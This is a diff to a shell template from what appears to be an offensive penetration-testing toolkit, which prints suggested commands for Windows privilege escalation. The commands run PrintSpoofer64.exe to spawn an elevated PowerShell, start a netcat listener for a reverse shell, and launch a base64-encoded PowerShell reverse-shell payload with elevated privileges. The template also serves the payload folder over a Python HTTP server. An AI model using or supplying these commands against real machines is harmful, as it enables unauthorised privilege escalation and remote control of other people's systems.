@@ -7,6 +7,6 @@ echo '================================================================'; \
 echo '                      -Suggested Commands-                      '; \
 echo 'To execute in-place: <%=$(esh variables/delivery_path_windows)%>\PrintSpoofer64.exe -i -c powershell.exe'; \
 echo 'Preparation 1 (for revshell): nc -lvnp <%=$(esh variables/shell_port)%>'; \
-echo 'To open another revshell with elevated privileges: <%=$(esh variables/delivery_path_windows)%>\PrintSpoofer64.exe -i -c "powershell -e <%=${payload:-$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)}%>"'; \
+echo 'To open another revshell with elevated privileges: <%=$(esh variables/delivery_path_windows)%>\PrintSpoofer64.exe -i -c "<%=${payload:-$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)}%>"'; \
 echo '================================================================'; \
 python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
